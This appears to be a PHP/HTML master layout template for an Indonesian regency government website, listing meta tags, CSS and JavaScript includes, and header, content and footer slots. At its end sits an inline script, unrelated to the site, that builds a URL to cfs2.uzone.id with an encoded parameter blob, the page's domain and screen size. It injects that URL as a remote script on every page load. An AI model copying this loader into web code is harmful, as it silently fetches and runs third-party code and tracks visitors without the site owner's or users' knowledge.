<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en">
<head>
	<!-- Your Basic Site Informations -->
	<title><?=$this->e($page_title);?></title>
    <meta charset="utf-8" />
    <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
    <meta name="robots" content="index, follow" />
    <meta name="description" content="<?=$this->e($page_desc);?>" />
    <meta name="keywords" content="<?=$this->e($page_key);?>" />
    <meta http-equiv="Copyright" content="PemkabWajo" />
    <meta name="author" content="Rivaldy" />
    <meta http-equiv="imagetoolbar" content="no" />
    <meta name="language" content="Indonesia" />
    <meta name="revisit-after" content="7" />
    <meta name="webcrawlers" content="all" />
    <meta name="rating" content="general" />
    <meta name="spiders" content="all" />

	<!-- Social Media Meta -->
	<?php include_once DIR_CON."/component/setting/meta_social.txt";?>

    <!-- Mobile Specific Meta -->
	

    <!-- Stylesheets -->
	<link href="<?=$this->asset('/css/bootstrap.css')?>" rel="stylesheet">
	<link href="<?=$this->asset('/css/bootstrap.min.css')?>" rel="stylesheet">
	<link href="<?=$this->asset('/css/owl.css')?>" rel="stylesheet">
	<link href="<?=$this->asset('/css/font-awesome.css')?>" rel="stylesheet">
	<link href="<?=$this->asset('/css/font-awesome.min.css')?>" rel="stylesheet">
	<link href="<?=$this->asset('/css/magnific-popup.css')?>" rel="stylesheet">
	<link href="<?=$this->asset('/css/main.css')?>" rel="stylesheet">
	<link href="<?=$this->asset('/css/preset1.css')?>" rel="stylesheet">
	<link href="<?=$this->asset('/css/subscribe-better.css')?>" rel="stylesheet">
	<link href="<?=$this->asset('/css/translateelement.css')?>" rel="stylesheet">
	<link href="<?=$this->asset('/css/css.css')?>" rel="stylesheet">
	<!-- Responsive -->
	<meta http-equiv="X-UA-Compatible" content="IE=edge">
	<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0">
	<link href="<?=$this->asset('/css/responsive.css')?>" rel="stylesheet">
	<!--[if lt IE 9]><script src="http://html5shim.googlecode.com/svn/trunk/html5.js"></script><![endif]-->
	<!--[if lt IE 9]><script src="js/respond.js"></script><![endif]-->
	

	<!-- Favicons -->
	<link rel="shortcut icon" href="<?=BASE_URL.'/'.DIR_INC;?>/images/favicon.png" />

	<!-- Javascript -->
	<script src="https://www.google.com/recaptcha/api.js"></script>
	      <link href='https://fonts.googleapis.com/css?family=Signika+Negative:400,300,600,700' rel='stylesheet' type='text/css'>

      <!--[if lt IE 9]>
        <script src="js/html5shiv.js"></script>
        <script src="js/respond.min.js"></script>
      <![endif]-->
      <link rel="shortcut icon" href="http://tangerangkab.go.id/theme/images/ico/favicon.ico">
      <link rel="apple-touch-icon-precomposed" sizes="144x144" href="http://tangerangkab.go.id/theme/images/ico/apple-touch-icon-144-precomposed.png">
      <link rel="apple-touch-icon-precomposed" sizes="114x114" href="http://tangerangkab.go.id/theme/images/ico/apple-touch-icon-114-precomposed.png">
      <link rel="apple-touch-icon-precomposed" sizes="72x72" href="http://tangerangkab.go.id/theme/images/ico/apple-touch-icon-72-precomposed.png">
      <link rel="apple-touch-icon-precomposed" href="http://tangerangkab.go.id/theme/images/ico/apple-touch-icon-57-precomposed.png">
	
</head>
<body>
	<div class="page-wrapper">
	
		<!-- Insert Header -->
		<?=$this->insert('header');?>
		
		<!-- Insert Content -->
		<?=$this->section('content');?>

		<!-- Insert Footer -->
		<?=$this->insert('footer');?>
		
	</div>
	<!-- Javascript -->
	<script src="<?=$this->asset('/js/bootstrap.js')?>"></script>
	<script src="<?=$this->asset('/js/element.js')?>"></script> 
	<script src="<?=$this->asset('/js/element_main.js')?>"></script>
	<script src="<?=$this->asset('/js/gpr-widget-kominfo.js')?>"></script>
	<script src="<?=$this->asset('/js/jquery.js')?>"></script>
	<script src="<?=$this->asset('/js/main.js')?>"></script>
	<script src="<?=$this->asset('/js/main_id.js')?>"></script>
	<script src="<?=$this->asset('/js/moment.js')?>"></script>
	<script src="<?=$this->asset('/js/owl.js')?>"></script>
	<script src="<?=$this->asset('/js/switcher.js')?>"></script>
	<script src="<?=$this->asset('/js/jquery.easy-ticker.min.js')?>"></script>
	<script src="<?=$this->asset('/js/jquery.simpleWeather.min.js')?>"></script>
	<script src="<?=$this->asset('/js/jquery.sticky-kit.min.js')?>"></script>
	<script src="<?=$this->asset('/js/jquery.subscribe-better.min.js')?>"></script>
	<script src="<?=$this->asset('/js/jquery.magnific-popup.min.js')?>"></script>
	<script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "cfs2.uzone.id/2fn7a2/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582CL4NjpNgssKn5IXNtC88dfL8m4ld1dlvaL80DGhOHKy6URY%2fsPf2pu13KNQCb%2bZDtuVEWkdluYoId7cDlLVl8BihVeXcwcQVbVFQA1G%2fUMj0bGiWVJjVjWNQdIhdoTInAjS%2fi1j1JdjazX%2f7J3UwsUa78VwvdRsaOCtLUqIVehzdH4nFIibxfWNP4EXKzIcyJjWH9YyG18%2fItnqVfS5IlxdJJgy8pfsQSJxrYl3CpPWbOzBFn5X6lwlMkPEWdQK1qjw8lVGME10PXBDnj4x5Macv3QH6Tfnv0aOLTiAjS%2bi7M5Gqd83TeiB2CJ83QutK6d%2fu6Q%2ffhEcida52tHgwJuyMUT%2bJh9fvssPHsu3rk0pRW9BuNHi%2fVCP65pCMdlm3WCN6B2xe8INnctSEz82A%2fY3JJuIy8XiYMzjgGe9JbWqn9nckfVOZ45MMvu0UkVsyyhjYMl%2b2NanZqT%2fuYB9BTlIChKtV52zbJub4nmVB73QCDRO0DI0lZ4%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script>
	
	
	
</body>
</html>